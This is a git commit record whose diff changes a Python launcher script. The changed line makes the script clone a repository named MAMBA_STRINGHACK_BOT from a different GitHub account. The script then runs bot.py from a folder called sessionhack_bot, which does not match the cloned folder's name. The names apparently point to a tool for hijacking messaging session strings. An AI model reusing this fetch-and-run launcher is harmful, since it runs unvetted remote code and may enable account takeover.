3fd64104f017a7babfa71f1ed9bcb6708019a642
Navya-Developer <83151110+NAVYA-DEVELOPER@users.noreply.github.com>
2022-04-04 12:05:11 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,3 @@
 import os
-os.system("git clone https://github.com/SUKHPAL443/MAMBA_STRINGHACK_BOT")
+os.system("git clone https://github.com/NAVYA-DEVELOPER/MAMBA_STRINGHACK_BOT")
 os.system("cd sessionhack_bot && python bot.py")
